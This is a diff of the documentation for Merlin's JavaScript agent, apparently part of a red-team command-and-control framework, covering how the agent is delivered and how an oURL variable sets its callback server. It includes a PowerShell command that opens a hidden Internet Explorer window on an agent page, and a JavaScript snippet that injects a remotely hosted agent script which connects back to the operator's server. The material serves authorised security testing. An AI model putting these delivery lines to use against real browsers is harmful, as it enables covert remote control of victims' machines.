@@ -43,7 +43,7 @@ example of practical application is in the *Deployment Methods* section.
 * Cross-Site Scripting (XSS)
 * Inject directly into the DOM
 * Windows IE COM Object
-* From github with override `oURL` JavaScript variable
+* Override oURLJavaScript variable
 
 ### Merlin JavaScript Agent Test Page
 Merlin ships with an HTML page that can be used to test the
@@ -107,9 +107,17 @@ An example PowerShell command is:
 
 `$W=New-Object -com 'InternetExplorer.Application';$W.visible=$False;$W.navigate('http://www.acmewidgets.com:8000/merlin.html')`
 
-### GitHub
-You _should_ be able to use GitHub and the Override URL together as a
-delivery method.
+### Override URL
+You can host the JavaScript in its original form without having to hard
+code your Merlin Server’s URL in the file. Merlin checks the DOM for the
+`oURL` variable and will use its value to connect back with (if it
+exists). This provides flexibility to dynamically change the Merlin
+Server’s URL on the fly.
 
-An example command is:
-`var oURL='https://your.merlin.server:443/';var merlin=document.createElement('script');merlin.src='https://raw.githubusercontent.com/Ne0nd0g/merlin/master/data/html/scripts/merlin.js';document.head.appendChild(merlin);`
+Note: If the place you are hosting the file returns the JavaScript file
+with a content-type of `text/plain`, then the _Merlin JavaScript Agent_
+will fail to load due to strict MIME type checking. The precludes you
+from calling the file directly from GitHub. However, if no content-type
+is provided, the agent should run.
+
+An example command is: `var oURL='https://your.merlin.server:443/';var merlin=document.createElement('script');merlin.src='https://some.hosting.provider/merlin.js';document.head.appendChild(merlin);`
